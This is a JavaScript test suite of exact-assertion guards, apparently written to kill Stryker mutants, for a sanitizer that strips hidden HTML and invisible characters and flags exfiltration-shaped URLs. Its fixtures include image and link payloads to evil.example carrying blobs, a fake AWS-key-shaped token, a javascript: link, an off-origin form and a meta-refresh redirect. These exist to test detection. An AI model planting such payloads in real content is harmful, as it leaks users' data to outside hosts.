/**
 * Exact-assertion guards motivated by Stryker mutation testing: each case below
 * kills a mutant that the existing suites left alive (a flipped comparison, a
 * blanked branch, an emptied warning string, a swapped offset). They pin
 * behavior the looser `assert.match` / "is included" checks elsewhere did not —
 * the warning/`found` TEXT and the integer boundaries of the splice/exfil logic.
 *
 * Kept separate from the topic suites so the provenance ("this exists to kill a
 * mutant") stays legible; every assertion is exact-equality, never a substring.
 */
import { describe, it } from "node:test";
import assert from "node:assert/strict";

import { sanitize, CATEGORY, CATEGORY_LABELS } from "../src/index.mjs";
import { cp } from "./test-helpers.mjs";
import {
  spliceRanges,
  sanitizeHtml,
  detectExfil,
  checkExfilUrl,
  COMMENT_PLACEHOLDER,
  HIDDEN_PLACEHOLDER,
} from "../src/html.mjs";

// ─── index.mjs: describeRemoved / describeWarned exact warning text ───────────
// The existing html-path tests only `assert.match(/HTML sanitized/)`, so blanking
// the per-count clauses (`${removed.comments} HTML comment(s)`) survived. Pin the
// whole warning string.

describe("guard: sanitize warning text is exact, not just present", () => {
  it("names both removed counts in the HTML-sanitized warning", async () => {
    const out = await sanitize(
      "a <!-- one --> b <!-- two --> c <span hidden>S</span> d",
      { html: true },
    );
    const warn = out.warnings.find((w) => w.startsWith("HTML sanitized:"));
    assert.equal(
      warn,
      "HTML sanitized: 2 HTML comment(s), 1 hidden element(s) replaced with placeholders",
    );
  });

  it("omits the hidden clause when only comments were removed", async () => {
    const out = await sanitize("a <!-- c --> b", { html: true });
    const warn = out.warnings.find((w) => w.startsWith("HTML sanitized:"));
    assert.equal(
      warn,
      "HTML sanitized: 1 HTML comment(s) replaced with placeholders",
    );
  });

  it("omits the comment clause when only a hidden element was removed", async () => {
    const out = await sanitize("a <span hidden>S</span> b", { html: true });
    const warn = out.warnings.find((w) => w.startsWith("HTML sanitized:"));
    assert.equal(
      warn,
      "HTML sanitized: 1 hidden element(s) replaced with placeholders",
    );
  });

  it("renders the preserved-tag warning with exact tag×count and data: URI×count", async () => {
    const out = await sanitize(
      '<script>a</script><script>b</script><img src="data:text/html,x">',
      { html: true },
    );
    const warn = out.warnings.find((w) =>
      w.startsWith("Preserved but reported"),
    );
    assert.equal(
      warn,
      "Preserved but reported (page source kept inspectable): script×2, data: URI×1",
    );
  });

  it("renders the exfil warning naming image/link, host, and reason exactly", async () => {
    const blob = "A".repeat(44);
    const out = await sanitize(`![alt](https://evil.example/p?data=${blob})`, {
      html: true,
    });
    const warn = out.warnings.find((w) =>
      w.startsWith("Exfil-shaped URLs detected"),
    );
    assert.equal(
      warn,
      "Exfil-shaped URLs detected: image to evil.example: suspicious query parameter",
    );
  });

  it("joins multiple distinct exfil reasons with '; ' (separator is load-bearing)", async () => {
    // Two threats with DIFFERENT reasons so the join separator actually appears
    // in the output — a single-threat case cannot distinguish "; " from "".
    const blob = "A".repeat(44);
    const out = await sanitize(
      `[a](https://evil.example/p?data=${blob}) and [b](javascript:alert(1))`,
      { html: true },
    );
    const warn = out.warnings.find((w) =>
      w.startsWith("Exfil-shaped URLs detected"),
    );
    assert.equal(
      warn,
      "Exfil-shaped URLs detected: link to evil.example: suspicious query parameter; link to : script-executing URI",
    );
  });

  it("records HTML_COMMENTS in found only when a comment was removed", async () => {
    // Only a hidden element is removed: HIDDEN_HTML must be in found, but
    // HTML_COMMENTS must NOT — pins the `removed.comments > 0` guard (a `>= 0`
    // mutant would push HTML_COMMENTS with a zero comment count).
    const out = await sanitize("a <span hidden>x</span> b", { html: true });
    assert.equal(out.found.includes(CATEGORY.HIDDEN_HTML), true);
    assert.equal(out.found.includes(CATEGORY.HTML_COMMENTS), false);
  });

  it("records HTML_COMMENTS but not HIDDEN_HTML when only a comment was removed", async () => {
    const out = await sanitize("a <!-- c --> b", { html: true });
    assert.equal(out.found.includes(CATEGORY.HTML_COMMENTS), true);
    assert.equal(out.found.includes(CATEGORY.HIDDEN_HTML), false);
  });

  it("never emits an empty warning string when nothing was preserved", async () => {
    // A hidden element is spliced (so layer2 exists and text changed) but no
    // REPORTED_TAGS / data: URI is present, so describeWarned() === "". The
    // `if (preserved)` guard must suppress it — a mutant forcing the push would
    // add an empty-string warning.
    const out = await sanitize("a <span hidden>x</span> b", { html: true });
    assert.equal(
      out.warnings.every((w) => w.length > 0),
      true,
    );
    assert.equal(out.warnings.includes(""), false);
  });

  it("does not push comment/hidden found when only a tag is preserved (text unchanged)", async () => {
    // A preserved <script> warns but splices nothing, so neither HTML_COMMENTS
    // nor HIDDEN_HTML may appear in found — pins the `layer2.text !== cleaned`
    // guard against a `true` mutant.
    const out = await sanitize("see <script>x</script> here", { html: true });
    assert.equal(out.found.includes(CATEGORY.HTML_COMMENTS), false);
    assert.equal(out.found.includes(CATEGORY.HIDDEN_HTML), false);
  });

  it("renders the Stripped warning with the exact category labels", async () => {
    // ZWSP (Cf) + VS-16 (variation selector): two distinct strip categories, in
    // CHECKS order, so the label list is pinned exactly.
    const out = await sanitize(`x${cp(0x200b)}y${cp(0xfe0f)}z`);
    const warn = out.warnings.find((w) => w.startsWith("Stripped:"));
    assert.equal(
      warn,
      `Stripped: ${CATEGORY_LABELS[CATEGORY.CF]}, ${CATEGORY_LABELS[CATEGORY.VARIATION_SELECTORS]}`,
    );
  });
});

// ─── index.mjs: the CATEGORY codes are the stable machine contract ────────────
// A StringLiteral mutant blanking a CATEGORY value (e.g. CF: "") survives unless
// a test pins the literal that callers branch on.

describe("guard: CATEGORY codes are the documented literals", () => {
  it("exposes the exact stable category strings", () => {
    assert.deepEqual(
      { ...CATEGORY },
      {
        CF: "cf-format",
        VARIATION_SELECTORS: "variation-selectors",
        BLANK_FILLERS: "blank-fillers",
        ANSI: "ansi",
        LONE_SURROGATES: "lone-surrogates",
        HTML_COMMENTS: "html-comments",
        HIDDEN_HTML: "hidden-html",
        EXFIL_URLS: "exfil-urls",
      },
    );
  });
});

// ─── html.mjs: spliceRanges merge boundary (range.end > last.end) ─────────────
// A nested range fully inside an earlier one must NOT extend it; `>=` would.

describe("guard: spliceRanges merge keeps the wider end, drops the narrower", () => {
  it("a nested range does not shrink the enclosing placeholder", () => {
    const text = "0123456789";
    // Outer [1,8) hidden, inner [3,5) hidden fully contained: merge to one
    // [1,8) hidden range; the inner end (5) must not replace the outer end (8).
    const out = spliceRanges(text, [
      { start: 1, end: 8, kind: "hidden" },
      { start: 3, end: 5, kind: "hidden" },
    ]);
    assert.equal(out, "0" + HIDDEN_PLACEHOLDER + "89");
  });

  it("an overlapping range that extends past the first widens the merge", () => {
    const text = "0123456789";
    const out = spliceRanges(text, [
      { start: 1, end: 5, kind: "hidden" },
      { start: 4, end: 8, kind: "hidden" },
    ]);
    assert.equal(out, "0" + HIDDEN_PLACEHOLDER + "89");
  });

  it("sorts by start then end so placeholders land in document order", () => {
    const text = "abcdefgh";
    const out = spliceRanges(text, [
      { start: 5, end: 7, kind: "hidden" },
      { start: 1, end: 3, kind: "comment" },
    ]);
    assert.equal(
      out,
      "a" + COMMENT_PLACEHOLDER + "de" + HIDDEN_PLACEHOLDER + "h",
    );
  });
});

// ─── html.mjs: sanitizeHtml removed counting keys off range.kind ──────────────
// `range.kind === "comment"` chooses the bucket; flipping it miscounts.

describe("guard: sanitizeHtml counts comments and hidden into the right buckets", () => {
  it("reports exactly the comment and hidden removal counts", () => {
    const result = sanitizeHtml(
      "a <!-- c1 --> b <!-- c2 --> c <span hidden>x</span> d",
    );
    assert.deepEqual(result.removed, { comments: 2, hidden: 1 });
  });
});

// ─── html.mjs: rawParams name lowercasing + value splitting ───────────────────
// A `name=value` exfil param must be matched case-insensitively, and the value
// (everything after the first `=`) preserved verbatim including any `=`.

describe("guard: URL parameter parsing is case- and '='-correct", () => {
  it("flags a credential value in a non-keyword param via the param walk", () => {
    // `field` is neither an EXFIL_INDICATOR keyword nor a benign-blob name, so
    // the verdict must come from paramExfilReason on a credential-shaped value:
    // a synthetic low-entropy AKIA-arm token (20+ opaque chars with a digit)
    // that matches the secret-shape gate without resembling a real key.
    const value = "AKIA" + "A".repeat(15) + "1";
    const reason = checkExfilUrl(`https://evil.example/p?field=${value}`);
    assert.equal(reason, "credential-shaped token in URL parameter");
  });

  it("lower-cases the param name before the benign-allowlist check", () => {
    // An UPPERCASE benign param name (`SIG`) must lower-case to `sig` and be
    // allowlisted; a blob in it is therefore NOT flagged. A toUpperCase mutant
    // would leave `SIG` unmatched by the lowercase allowlist and wrongly flag.
    const reason = checkExfilUrl(
      "https://cdn.example/o?SIG=" + "A".repeat(44) + "==",
    );
    assert.equal(reason, null);
  });

  it("keeps a base64 value containing '=' padding intact for the blob match", () => {
    // The value has '=' padding; splitting on the FIRST '=' must keep the rest.
    const value = "A".repeat(42) + "==";
    const reason = checkExfilUrl(`https://evil.example/p?q=${value}`);
    assert.equal(reason, "suspicious query parameter");
  });
});

// ─── html.mjs: checkUrlParams also walks the fragment ─────────────────────────
// `parsed.hash.slice(1)` — a credential in `#token=…` must be caught, not only
// in the query.

describe("guard: exfil param walk covers the fragment channel", () => {
  it("flags a blob carried in the URL fragment", () => {
    const value = "B".repeat(50);
    const reason = checkExfilUrl(`https://evil.example/p#leakparam=${value}`);
    assert.equal(reason, "suspicious query parameter");
  });
});

// ─── html.mjs: allParamsBenign suppresses long-query only when ALL benign ─────
// `.every` not `.some`: one non-benign param in a long query must still flag.

describe("guard: a long signed-CDN query stays benign, a mixed one does not", () => {
  const benignPad = "&X-Amz-Signature=" + "a".repeat(200);
  it("does not flag a long query whose every param is allowlisted", () => {
    const url =
      "https://cdn.example/o?X-Amz-Algorithm=AWS4-HMAC-SHA256" + benignPad;
    assert.equal(checkExfilUrl(url), null);
  });
  it("flags a long query that mixes one non-allowlisted param in", () => {
    const url =
      "https://cdn.example/o?foo=bar&X-Amz-Algorithm=AWS4-HMAC-SHA256" +
      benignPad;
    assert.equal(checkExfilUrl(url), "unusually long query string");
  });
});

// ─── html.mjs: off-origin form/refresh reasons (startsWith RELATIVE base) ─────
// A form posting off-origin, or a meta-refresh redirecting off-origin, is the
// signal regardless of query shape; a same-origin relative target is not.

describe("guard: off-origin form action and meta-refresh are flagged by context", () => {
  it("flags an off-origin form action", () => {
    const threats = detectExfil(
      '<form action="https://evil.example/c"></form>',
    );
    assert.deepEqual(threats, [
      {
        isImage: false,
        reason: "off-origin form action",
        target: "evil.example",
      },
    ]);
  });

  it("flags an off-origin meta-refresh redirect", () => {
    const threats = detectExfil(
      '<meta http-equiv="refresh" content="0; url=https://evil.example/go">',
    );
    assert.deepEqual(threats, [
      {
        isImage: false,
        reason: "off-origin meta-refresh redirect",
        target: "evil.example",
      },
    ]);
  });

  it("does not flag a relative (same-origin) form action", () => {
    assert.equal(detectExfil('<form action="/local/path"></form>'), null);
  });
});

// ─── html.mjs: multiUrlAttr takes the first token of each srcset candidate ────
// `candidate.trim().split(/\s+/)[0]` — the descriptor (`2x`) is dropped and the
// URL kept; an exfil URL in a srcset must still be flagged.

describe("guard: srcset URL (first token, descriptor dropped) is scanned", () => {
  it("flags an exfil URL given with a density descriptor in srcset", () => {
    const blob = "C".repeat(44);
    const threats = detectExfil(
      `<img srcset="https://evil.example/x?data=${blob} 2x">`,
    );
    assert.equal(threats?.length, 1);
    assert.equal(threats[0].target, "evil.example");
    assert.equal(threats[0].reason, "suspicious query parameter");
    assert.equal(threats[0].isImage, true);
  });
});
